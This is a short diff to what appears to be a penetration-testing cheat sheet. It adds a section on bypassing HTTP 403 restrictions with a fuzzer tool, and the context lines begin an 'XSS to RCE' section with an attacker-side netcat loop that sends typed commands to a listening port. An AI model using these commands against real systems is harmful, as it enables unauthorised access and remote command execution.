@@ -221,6 +221,13 @@ run getgui -u [USER_NAME] -p [PASS]
 `./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>`
 
 # Web
+
+### 403 By pass
+
+https://github.com/intrudir/403fuzzer <br />
+
+`python3 403fuzzer.py -hc 403 -u http://<ip>/page_that_you_want_to_bypass(which is usally a 403 foribben)`
+
 ### XSS to RCE
 ```
 Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
